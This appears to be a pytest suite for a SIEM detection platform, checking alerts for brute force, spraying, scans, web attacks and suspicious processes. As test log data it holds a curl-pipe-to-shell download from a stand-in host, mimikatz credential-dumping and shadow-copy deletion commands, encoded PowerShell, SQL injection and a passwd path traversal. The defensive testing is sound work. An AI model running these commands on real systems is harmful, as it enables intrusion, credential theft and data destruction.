import json

from conftest import T0, iso, ssh_fail, ssh_ok


def rules(platform):
    return {a["rule_id"] for a in platform.store.list_alerts()}


def ingest(platform, lines, host=None):
    return platform.ingest_lines(lines, default_host=host, ref_time=T0 + 86400)


def test_brute_force_detected_and_merged_incrementally(platform):
    ingest(platform, [ssh_fail(T0 + i, "app01", "root", "6.6.6.6", 1000 + i) for i in range(10)])
    alerts = platform.store.list_alerts()
    assert [a["rule_id"] for a in alerts] == ["brute_force"]
    assert alerts[0]["src_ip"] == "6.6.6.6" and "T1110.001" in alerts[0]["techniques"]
    first_id = alerts[0]["id"]
    # more failures from the same attacker extend the same alert instead of creating a new one
    r = ingest(platform, [ssh_fail(T0 + 20 + i, "app01", "root", "6.6.6.6", 2000 + i) for i in range(10)])
    alerts = [a for a in platform.store.list_alerts() if a["rule_id"] == "brute_force"]
    assert len(alerts) == 1 and alerts[0]["id"] == first_id and alerts[0]["event_count"] == 20
    assert r["alerts_updated"] >= 1


def test_below_threshold_is_not_flagged(platform):
    ingest(platform, [ssh_fail(T0 + i, "app01", "bob", "10.0.0.9") for i in range(4)])
    assert platform.store.list_alerts() == []


def test_duplicate_lines_are_ignored(platform):
    lines = [ssh_fail(T0 + i, "app01", "root", "6.6.6.6", 1000 + i) for i in range(10)]
    ingest(platform, lines)
    r = ingest(platform, lines)
    assert r["stored"] == 0 and r["duplicates"] == 10
    assert platform.store.count_events() == 10


def test_password_spray_vs_brute_force(platform):
    users = ["a", "b", "c", "d", "e", "f", "g"]
    ingest(platform, [ssh_fail(T0 + i, "dc", users[i % 7], "7.7.7.7", 3000 + i) for i in range(14)])
    assert rules(platform) == {"password_spray"}


def test_compromised_account_and_investigation(platform):
    lines = [ssh_fail(T0 + i, "app01", "deploy", "8.8.4.4", 4000 + i) for i in range(12)]
    lines.append(ssh_ok(T0 + 30, "app01", "deploy", "8.8.4.4"))
    lines.append(f"{iso(T0 + 60)} app01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'curl http://x.example/a.sh | sh'")
    ingest(platform, lines)
    by_rule = {a["rule_id"]: a for a in platform.store.list_alerts()}
    assert {"brute_force", "compromised_account", "proc_pipe_to_shell"} <= set(by_rule)
    comp = by_rule["compromised_account"]
    assert comp["severity"] == "critical" and comp["verdict"] == "likely_compromise" and comp["risk_score"] >= 85
    inv = platform.store.get_investigation(comp["id"])
    assert inv["compromised"][0]["user"] == "deploy"
    assert any(f["level"] == "critical" and "curl" in f["text"] for f in inv["findings"])
    assert inv["kill_chain"] and inv["explanation"]["source"] == "template"
    # the brute-force alert is investigated too and discovers the later success
    bf = platform.store.get_investigation(by_rule["brute_force"]["id"])
    assert bf["compromised"] and bf["verdict"] == "likely_compromise"


def test_port_scan(platform):
    lines = [json.dumps({"type": "flow", "timestamp": iso(T0 + i * 0.2), "host": "fw", "src_ip": "5.5.5.5",
                         "dst_ip": "10.0.0.10", "dst_port": 1000 + i, "action": "deny"}) for i in range(40)]
    ingest(platform, lines)
    a = [x for x in platform.store.list_alerts() if x["rule_id"] == "port_scan"]
    assert len(a) == 1 and "T1046" in a[0]["techniques"]


def test_web_attack_double_encoded_and_scanner(platform):
    def w(i, url, status=200, ua="Mozilla/5.0"):
        return f'9.9.9.9 - - [14/Oct/2025:12:00:{i:02d} +0000] "GET {url} HTTP/1.1" {status} 10 "-" "{ua}"'
    lines = [w(1, "/p?id=1%2520UNION%2520SELECT%2520a,b"), w(2, "/dl?f=../../etc/passwd"), w(3, "/x", 404, "sqlmap/1.7"),
             w(4, "/ok"), w(5, "/home")]
    platform.ingest_lines(lines, default_host="web01", ref_time=T0)
    a = [x for x in platform.store.list_alerts() if x["rule_id"] == "web_attack"]
    assert len(a) == 1 and a[0]["severity"] == "high" and a[0]["event_count"] == 3
    assert "T1595.002" in a[0]["techniques"]


def test_benign_web_traffic_is_quiet(platform):
    lines = [f'1.2.3.{i % 50 + 1} - - [14/Oct/2025:12:{i // 60:02d}:{i % 60:02d} +0000] "GET /products?page={i} HTTP/1.1" 200 10 "-" "Mozilla/5.0"' for i in range(200)]
    platform.ingest_lines(lines, default_host="web01", ref_time=T0)
    assert platform.store.list_alerts() == []


def test_suspicious_processes(platform):
    def p(i, cmd, exe="x.exe"):
        return json.dumps({"EventID": 4688, "TimeCreated": iso(T0 + i), "Computer": "ws9", "SubjectUserName": "kim", "NewProcessName": "C:\\" + exe, "CommandLine": cmd})
    lines = [
        p(1, "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="),
        p(2, "m.exe privilege::debug sekurlsa::logonpasswords"),
        p(3, "vssadmin.exe delete shadows /all /quiet"),
        p(4, "powershell.exe -File C:\\scripts\\backup.ps1"),   # benign
        p(5, "chrome.exe --type=renderer"),                       # benign
    ]
    ingest(platform, lines)
    got = rules(platform)
    assert {"proc_encoded_powershell", "proc_credential_dumping", "proc_inhibit_recovery"} <= got
    assert not any(a["event_count"] > 1 for a in platform.store.list_alerts())


def test_account_persistence_and_log_clear(platform):
    lines = [
        json.dumps({"EventID": 4720, "TimeCreated": iso(T0), "Computer": "ws9", "TargetUserName": "bk", "SubjectUserName": "kim"}),
        json.dumps({"EventID": 4732, "TimeCreated": iso(T0 + 5), "Computer": "ws9", "MemberName": "CN=bk,DC=x", "TargetUserName": "Administrators", "SubjectUserName": "kim"}),
        json.dumps({"EventID": 1102, "TimeCreated": iso(T0 + 9), "Computer": "ws9", "SubjectUserName": "kim"}),
    ]
    ingest(platform, lines)
    by = {a["rule_id"]: a for a in platform.store.list_alerts()}
    assert by["account_persistence"]["severity"] == "critical"
    assert "T1136" in by["account_persistence"]["techniques"] and "T1098" in by["account_persistence"]["techniques"]
    assert by["log_cleared"]["severity"] == "high"


def test_lateral_movement_requires_novel_hosts(platform):
    # baseline: alice routinely uses all three hosts -> not lateral movement
    base = []
    for d in range(1, 4):
        for h in ("h1", "h2", "h3"):
            base.append(ssh_ok(T0 - d * 86400 + len(h) * 60 + int(h[1]) * 30, h, "alice", "10.0.0.5"))
    ingest(platform, base)
    ingest(platform, [ssh_ok(T0 + 10, "h1", "alice", "10.0.0.5"), ssh_ok(T0 + 40, "h2", "alice", "10.0.0.5"), ssh_ok(T0 + 80, "h3", "alice", "10.0.0.5")])
    assert "lateral_movement" not in rules(platform)
    # mallory suddenly reaches three hosts she has never used
    ingest(platform, [ssh_ok(T0 + 10, "h1", "mallory", "10.9.9.9"), ssh_ok(T0 + 40, "h2", "mallory", "10.9.9.9"), ssh_ok(T0 + 80, "h3", "mallory", "10.9.9.9")])
    lm = [a for a in platform.store.list_alerts() if a["rule_id"] == "lateral_movement"]
    assert len(lm) == 1 and lm[0]["user"] == "mallory"


def test_off_hours_login(platform):
    # 03:00 UTC
    ts = 1_760_068_800.0 - (1_760_068_800.0 % 86400) + 3 * 3600
    ingest(platform, [ssh_ok(ts, "app01", "alice", "10.0.0.2")])
    a = platform.store.list_alerts()
    assert len(a) == 1 and a[0]["rule_id"] == "off_hours_login" and a[0]["severity"] == "low"


def test_volume_anomaly_against_baseline(platform):
    base = T0 - (T0 % 3600)                     # align to a clock hour so the burst lands in one bucket
    lines = []
    for h in range(1, 13):                      # 12 baseline hours, ~20 events/hour
        for i in range(20):
            lines.append(f"{iso(base + h * 3600 + i * 60)} web9 CRON[1]: job {h}-{i} ran")
    for i in range(300):                        # then a burst
        lines.append(f"{iso(base + 13 * 3600 + i * 5)} web9 CRON[1]: burst {i}")
    ingest(platform, lines)
    a = [x for x in platform.store.list_alerts() if x["rule_id"] == "volume_anomaly"]
    assert len(a) == 1 and a[0]["extra"]["count"] >= 250


def test_beaconing_hunt(platform):
    lines = [json.dumps({"type": "flow", "timestamp": iso(T0 + i * 60 + (i % 3) * 0.4), "host": "fw", "src_ip": "10.0.2.9",
                         "dst_ip": "198.51.100.200", "dst_port": 443, "action": "allow"}) for i in range(20)]
    # human-like browsing to another server: irregular intervals -> must NOT be flagged
    t = T0
    for gap in [3, 400, 12, 900, 45, 7, 600, 20, 300, 5]:
        t += gap
        lines.append(json.dumps({"type": "flow", "timestamp": iso(t), "host": "fw", "src_ip": "10.0.2.9", "dst_ip": "151.101.1.1", "dst_port": 443, "action": "allow"}))
    ingest(platform, lines)
    b = [a for a in platform.store.list_alerts() if a["rule_id"] == "hunt_beaconing"]
    assert len(b) == 1 and "198.51.100.200" in b[0]["title"] and b[0]["severity"] == "high"


def test_simulator_end_to_end(platform):
    from siem_hunter import simulator

    end = T0 + 2 * 86400
    for name, lines in simulator.generate(end_ts=end).items():
        platform.ingest_lines(lines, default_host=simulator.DEFAULT_HOSTS.get(name), ref_time=end)
    got = rules(platform)
    expected = {"brute_force", "compromised_account", "password_spray", "port_scan", "web_attack", "lateral_movement",
                "account_persistence", "log_cleared", "hunt_beaconing", "volume_anomaly", "proc_encoded_powershell",
                "proc_credential_dumping", "proc_inhibit_recovery", "proc_pipe_to_shell", "proc_download_cradle"}
    assert expected <= got, expected - got
    # a normal day with no attack raises nothing
    from siem_hunter.pipeline import Platform
    from siem_hunter.store import Store
    quiet = Platform(platform.cfg, Store(":memory:"))
    for name, lines in simulator.generate(end_ts=end, attack=False).items():
        quiet.ingest_lines(lines, default_host=simulator.DEFAULT_HOSTS.get(name), ref_time=end)
    assert quiet.store.list_alerts() == []
